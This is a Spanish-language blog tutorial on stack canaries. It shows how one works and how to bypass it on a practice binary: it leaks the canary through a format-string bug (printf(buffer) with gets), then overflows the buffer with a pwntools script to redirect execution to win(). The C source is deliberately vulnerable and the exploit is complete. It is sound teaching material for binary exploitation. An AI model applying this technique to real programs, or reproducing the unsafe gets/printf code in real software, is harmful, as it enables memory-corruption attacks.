---
layout: post
title: Leak stack canary - bypass
author: c4rta
date: 2022-08-03
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, format string, canary bypass]
image: /assets/img/leak-stack-canary/waifu.jpg
---
En este post veras como puedes hacer bypass del stack canary lekeandolo usando format strings
{:.lead}

## Que es el stack canary y como funciona

El stack canary es un valor random que se genera en el stack y cambia cada vez que se ejecuta un programa, y antes de que se ejecute el return adress el programa comprueba si el canary que se definio por defecto es igual que tiene antes de ejecutar el ret, donde si es diferente la ejecucion del programa se detiene. El canary se encuentra entre el buffer y el rbp y ret , de esta manera:

```
|----------|
|    ret   |
|----------|
|    rbp   |
|----------|
|  canary  |
|----------|
|  buffer  |
|----------|
```
Como se puede ver, el canary esta entre el ebp y el buffer. Si buscaron en internet antes y les salio que el canary esta entre el buffer y el ret, osea de esta forma tambien es correcto.

```
|----------|
|    ret   |
|----------|
|  canary  |
|----------|
|  buffer  |
|----------|
```

## Analizando el binario

El binario es un ejercicio propuesto por ir0nstone

```c
#include <stdio.h>

void vuln() {
    char buffer[64];

    puts("Leak me");
    gets(buffer);

    printf(buffer);
    puts("");

    puts("Overflow me");
    gets(buffer);
}

int main() {
    vuln();
}

void win() {
    puts("You won!");
}
```
En la funcion vuln tenemos un buffer de 64, despues tenemos un puts, y despues un ```gets```, este gets sirve para guardar nuestro input, despues con ```printf``` imprimimos ese input, de primeras se esta usando ```printf``` sin pasarle ningun format string, asi que sabiendo eso el programa es vulnerable a format string, por ultimo tenemos otros puts y gets, pasaremos a mostrar las protecciones del binario y nos muestra esto:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Hay dos que estan activadas y vemos que una de ellas es NX, asi que no podemos ejecutar una shellcode, la otra es el Canary que ya explique que era. Asi que haremos lo siguiente

### Nuestro plan

Para esta practica nos aprovecharemos de la vulnerabilidad format string para lekear el valor del canary, asi que cuando lanzemos nuestro exploit y ocasionemos el buffer overflow el canary lo vamos a sobreescribir por el mismo asi que el programa no va a parar su ejecucion y nos mostrara el mensaje ```You won!```. Ahora pasare a la parte del debugging


Primeramente usare radare2 ya que se me hace mas comodo y depues usare gdb con gef.

Ya se la saben banda, metemos el binario a radare, analizamos con ```aaa```, nos vamos el main con ```s main``` y lo mostramos con ```pdf```, vemos esto

![](/assets/img/leak-stack-canary/radare1.png)

Aqui realmente no hay nada interesante, mas que nada una llamada a la funcion ```vuln```, asi que ahora nos moveremos para alla con ```s sym.vuln``` y la mostraremos, vemos en la parte de arriba como se estan declarando dos variables de esta forma:
 
```
var int64_t canary @ rbp-0x8
var char *format @ rbp-0x50
```
La primera es el canary que se genero automaticamente, este se encuentra en ```rbp-0x8``` por debajo del ```rbp```.

Y la otra es format que solo es el format string que recibira el printf.
Ahora pasare a esta parte:

![](/assets/img/leak-stack-canary/radare2.png)

* La primera instruccion mueve el valor que se genero del Canary a rax
* La segunda mueve lo que tiene rax a canary

Bajare un poco mas para mostrar por que es vulnerable ```printf```a format string

![](/assets/img/leak-stack-canary/radare3.png)

Simplemente cuando se hace el llamado de ```printf``` no se le pasa para que reciba ningun format string, entonces por consiguiente podemos lekear valores de la memoria.

Pasare a mostrar la parte donde se hace la comprobacion del canary

![](/assets/img/leak-stack-canary/radare4.png)

* Lo primero que tenemos es una operacion de ```mov```, donde mueve el valor que tiene el canary antes de llegar al ret y lo mueve a ```rax```

* Despues tenemos una operacion de resta donde resta del valor del canary que se le asigno por defecto por el valor que tiene ```rax```

* Por ultimo tememos un salto condicional donde si es igual a 0, osea que ambos canaries son iguales se salta al bloque true, y si son diferentes el programa termina.

Hay que ver que en el bloque true tenemos el ret, ya que el flujo del programa siguio correctamente

## Lekeando el canary

### Visualizando el canary en radare2

Antes de lekearlo con format string, mostrare el stack para que ven el valor del canary que hay que lekear, para eso pondre un breakpoint donde se hace el llamado a la funcion printf en la funcion vuln, aqui:

```
0x00401192      e8b9feffff     call sym.imp.printf
```

Si continuamos la ejecucion del programa con ```dc``` e ingresamos cualquier input y mostramos el stack con ```pxr @ rsp``` vemos esto:

![](/assets/img/leak-stack-canary/radare5.png)

Primeramente vemos nuestro input, que en mi caso fue ```%p``` y un poco mas abajo esta el canary, que es el que tengo seleccionado, se que es el canary ya que normalmente los canary terminan con ```00``` y no inician con ```f7``` o ```ff``` y si vemos el canary que me salio a mi que fue ```0x0f36062cc7d73900``` tiene todas las caracteristicas que menciono

### Lekeando el canary con format string

Realmente para lekear el canary normalmente se usa fuzzing ya que es mas sencillo y todo automatico, pero nosotros le pasaremos los format strings al input del binario.

Al primer input le pasare todo esto:

```
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
```
El resultado de este input me dio esto:

![](/assets/img/leak-stack-canary/canary.png)

Y como se puede ver el valor que tengo seleccionado es el canary, y se que es ese por lo que mencione antes, ahora pasare a mostrar directamente lo que se encuentra en esa posicion para corroborar que si sea el canary

![](/assets/img/leak-stack-canary/canary2.png)

Como vemos si mostrarmos esa posicion que es la 15 nos muesta el canary, lo ejecute dos veces para ver si realmente era esa.

Asi que el canary se encuentra en la posicion ```15```


## Sacando el offset del canary

Para sacar su offset me ire a gdb y usare gef, una vez ahi mostrare del contenido de la funcion vuln y se ve algo asi:

![](/assets/img/leak-stack-canary/gdb.png)

No me detendre a explicar ya que es lo mismo que vimos en radare simplemente aqui pondre dos breakpoint aqui

El primero es aqui

```
   0x0000000000401163 <+17>:	mov    QWORD PTR [rbp-0x8],rax

   Este breakpoint lo puse aqui ya que es la parte donde el canary se encuentra en rax
```

El segundo es aqui

```
   0x00000000004011c5 <+115>:	sub    rax,QWORD PTR fs:0x28

   Que es donde se hace la resta de ambos canaries
```

Ahora si ejecutamos el programa y mostramos el contenido del registro ```rax``` de esta forma ```x/gx $rax``` podemos ver esto:

```
gef➤  x/gc $rax
0x4eb24e58c0443400:	Cannot access memory at address 0x4eb24e58c0443400
```
Vemos como el valor del canary que se genero por defecto es ```0x4eb24e58c0443400```

Ahora ahi mismo en gef generare 100 caracteres de esta forma ```patter create 100``` que nos servira para calcular el offset y se los pasare al binario como nuestro primer input. Y mostramos otra vez el valor de rax, vemos esto:

```
gef➤  x/gc $rax
0x616161616161616a:	Cannot access memory at address 0x616161616161616a
```

Ahora nuestro canary vale ```0x616161616161616a``` se ha sobreescrito, pero esto es lo que queremos ya que ahora con ```patter offset 0x616161616161616a``` podemos calcular su offset y nos muestra esto:

```
gef➤  patter offset 0x616161616161616a
[+] Searching for '0x616161616161616a'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
```
Y ahi lo tenemos, el offset del canary es 72, ahora si continuo la ejecucion del programa con los canaries diferentes podemos ver algo como esto:

```
gef➤  c
Continuing.
*** stack smashing detected ***: terminated
```
El programa se detiene ya que los canaries con diferentes.

## Ejecutando nuestro exploit

El exploit queda de esta manera

```python
from pwn import *

p = process("./vuln-64")

p.clean()
p.sendline('%15$p') #posicion del canary

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 72 # offset el canary
payload += p64(canary)
payload += b'A' * 8 # padding para llegar al ret
payload += p64(0x004011ec) #ret que en este caso es la direccion de la funcion win()

p.sendline(payload)
p.interactive()
```

Y listo

![](/assets/img/leak-stack-canary/pwn.png)

Eso ha sido todo, gracias por leer ❤